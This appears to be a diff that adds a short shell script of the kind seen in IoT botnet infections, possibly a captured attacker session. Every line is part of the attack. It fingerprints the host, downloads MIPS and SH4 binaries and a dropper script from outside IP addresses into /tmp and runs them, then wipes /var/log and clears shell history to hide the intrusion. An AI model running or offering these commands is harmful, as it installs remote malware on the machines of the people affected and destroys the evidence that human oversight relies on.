@@ -1,1 +1,20 @@
+uname -a
+cat /etc/*release
+ls /tmp
+cd /tmp
+wget http://185.244.x.x/bins/mips
+chmod +x mips
+./mips
+
+wget http://212.193.x.x/bins/sh4
+chmod +x sh4
+./sh4
+
+curl http://51.38.x.x/dropper.sh -o dropper.sh
+chmod +x dropper.sh
+sh dropper.sh
+
+rm -rf /var/log/*
+history -c
+exit
 
